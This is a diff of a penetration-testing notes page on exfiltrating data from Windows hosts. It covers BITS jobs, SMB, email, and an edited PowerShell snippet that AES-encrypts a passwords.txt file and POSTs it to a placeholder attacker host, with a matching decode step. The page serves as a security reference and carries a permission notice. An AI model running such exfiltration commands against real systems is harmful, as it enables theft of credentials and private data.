@@ -10,7 +10,7 @@ Always ensure you have **explicit** permission to access any computer system **b
 Not much here yet...please feel free to contribute at [my GitHub page](https://github.com/zweilosec/Infosec-Notes).
 {% endhint %}
 
-### BITS Jobs
+## Exfiltrate Data Using BITS Jobs
 
 {% tabs %}
 {% tab title="PowerShell" %}
@@ -59,11 +59,11 @@ bitsadmin /resume backdoor
 {% endtab %}
 {% endtabs %}
 
-### Using FTP
+## Exfiltrate Data Using FTP
 
 See [this section](privilege-escalation.md#using-ftp) under Privilege Escalation
 
-### Using SMB
+## Exfiltrate Data Using SMB
 
 {% tabs %}
 {% tab title="PowerShell" %}
@@ -87,27 +87,30 @@ For more about the New-SmbShare PowerShell cmdlet:
 
 See [this section](privilege-escalation.md#smb) under Privilege Escalation for more
 
-### HTTP POST with PowerShell
+## AES Encrypt and HTTP POST with PowerShell
 
-If you set up a web server to accept post requests, you can either AES encrypt or base64 encode your target data and simply send an HTTP request to the server with the data.
+If you set up a web server to accept post requests, you can either AES encrypt or base64 encode your target data and simply send an HTTP request to the server with the data.&#x20;
 
 Example with AES encrypted payload:
 
-```
+```powershell
 $file = Get-Content C:\Users\Target\Desktop\passwords.txt
-$key = (New-Object System.Text.ASCIIEncoding).GetBytes("UseMeToEncrypt")
+#key must be 128 bits (16 chars), 192 bits (24 chars), or 256 bits (32 chars) 
+$key = (New-Object System.Text.ASCIIEncoding).GetBytes("usemetodecryptit") 
 $securestring = New-Object System.Security.SecureString
-foreach ($char in $file.toCharArray()) {
-      $secureString.AppendChar($char)
-}
+
+foreach ($char in $file.toCharArray()) {$secureString.AppendChar($char)}
+
 $encryptedData = ConvertFrom-SecureString -SecureString $secureString -Key $key
 
 Invoke-WebRequest -Uri http://www.attacker.host/exfil -Method POST -Body $encryptedData
 ```
 
+You can also skip the last command to send the web request, and simply print the encoded data to the screen and copy to your other terminal (may create a very long wall of text if the file is large!).&#x20;
+
 To decode the data on the other side simply reverse the process:
 
-```
+```powershell
 $key = (New-Object System.Text.ASCIIEncoding).GetBytes("54b8617eca0e54c7d3c8e6732c6b687a")
 $encrypted = "$encrypted_payload"
 echo $encrypted | ConvertTo-SecureString -key $key | ForEach-Object {[Runtime.InteropServices.Marshal]::PtrToStringBSTR([Runtime.InteropServices.Marshal]::SecureStringToBSTR($_))}
@@ -123,9 +126,9 @@ One potential limitation I have noted is that it seems to strip out newline char
 
 You can always convert your data or files to be exfiltrated to Base64 text and simply copy and paste this in your terminal (or use bash/PowerShell magic to convert your target data back).  See [this section](privilege-escalation.md#covert-to-and-from-base64-with-powershell) under Privilege Escalation for more information on this technique.
 
-### Send an email with PowerShell
+## Send an email with PowerShell
 
-#### PowerShell `Send-MailMessage` cmdlet
+### PowerShell `Send-MailMessage` cmdlet
 
 ```powershell
 Send-MailMessage -From 'User01 <user01@fabrikam.com>' -To 'User02 <user02@fabrikam.com>', 'User03 <user03@fabrikam.com>' -Subject 'Sending the Attachment' -Body "Forgot to send the attachment. Sending now." -Attachments .\data.csv -Priority High -DeliveryNotificationOption OnSuccess, OnFailure -SmtpServer 'smtp.fabrikam.com'
